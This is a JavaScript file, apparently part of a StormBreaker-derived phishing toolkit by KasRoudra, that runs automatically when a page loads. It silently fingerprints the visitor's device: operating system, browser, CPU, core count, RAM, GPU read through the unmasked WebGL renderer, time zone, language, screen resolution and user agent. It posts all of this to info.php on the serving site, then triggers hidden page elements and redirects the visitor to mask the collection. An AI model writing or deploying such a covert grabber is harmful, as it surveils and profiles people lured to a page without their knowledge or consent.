// Requires ClientJS to work
// info.js by KasRoudra
// Author   : KasRoudra
// Github   : https://github.com/KasRoudra
// Email    : kasroudrard@gmail.com
// Messenger: https//m.me/KasRoudra
// Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker), and ClientJS
// CreatedAt: 10-08-2022

const info = (allow_redir) => {
    // post object as formdata
    const post = (obj, url=window.location.origin+"/info.php", error=false) => {
        const formData = new FormData();
        for (const key in obj) {
            formData.append(key, obj[key]);
        }
        fetch(url, {
            method: "POST",
            body: formData
        })
        .then(async (res) => {
            const text = await res.text();
            console.log(text);
            try {
                if (error) document.querySelector("#failure").click();
                else document.querySelector("#success").click();
            }
            catch (err) {
                console.log(err)
            }
            try {
                if (allow_redir && redirect_url) location.replace(redirect_url);
            }
            catch (err) {
                console.log(err)
            }
        })
        .catch((err) => {
            console.log(err)
            try {
                document.querySelector("#failure").click();
            }
            catch (err) {
                console.log(err)
            }
            try {
                if (allow_redir && redirect_url) location.replace(redirect_url);
            }
            catch (err) {
                console.log(err)
            }
        });
    };

    let os, os_ver, platform, browser, browser_ver, device, device_vendor, cpu, core, ram, engine, engine_ver, user_agent, time_zone, resolution, language, gpu_vendor, gpu_renderer, browser_data = "";
    
    const canvas = document.createElement("canvas");
    
    try {
        client = new ClientJS(); // Create a new client object

        browser_data = client.getBrowserData(); // Browser object
        
        platform = navigator.platform; // Platform of browser

        os = browser_data.os.name || client.getOS(); // Get OS version

        os_ver = browser_data.os.version || client.getOSVersion(); // Get OS version

        device = browser_data.device.model || client.getDevice(); // Get device

        device_vendor = browser_data.device.vendor || client.getDeviceVendor(); // Get device version

        browser = browser_data.browser.name || client.getBrowser(); // Get browser

        browser_ver = browser_data.browser.version || client.getBrowserVersion(); // Get browser version

        cpu = browser_data.cpu.architecture || client.getCPU(); // Get CPU architecture

        core = navigator.hardwareConcurrency; // Get core count
        
        ram = navigator.deviceMemory; // Get ram 

        engine = browser_data.engine.name || client.getEngine(); // Get engine

        engine_ver = browser_data.engine.version || client.getEngineVesion() // Get engine version

        user_agent = browser_data.ua || client.getUserAgent(); // Get user agent

        resolution = client.getCurrentResolution(); // Get current resolution

        language = client.getLanguage(); // Get user language

        time_zone = client.getTimeZone(); // Get time zone
        
        if (!cpu && platform.includes(" ")){
            [platform, cpu] = platform.split(" ")
        }
        
        const webgl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // Get GPU information from webgl
        
        const debugInfo = webgl.getExtension('WEBGL_debug_renderer_info');
        
        gpu_vendor = webgl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        
        gpu_renderer = webgl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        
    } catch (err) {
        console.log(err);
    }

    const details = {
        platform,
        os,
        os_ver,
        cpu,
        core,
        gpu_vendor,
        gpu_renderer,
        ram,
        device,
        device_vendor,
        browser,
        browser_ver,
        engine,
        engine_ver,
        resolution,
        language,
        user_agent,
        time_zone
    }
    
    const fileteredDetails = Object.fromEntries(
        Object.entries(details).map(arr => {
            if (!arr[1]) arr[1] = "Not Found";
            if (arr[0] === "ram" && arr[1]) arr[1] += "GB"
            return arr;
        })
    )
    
    post(fileteredDetails)
}


if (window.onload) {
    info()
}
else window.onload = info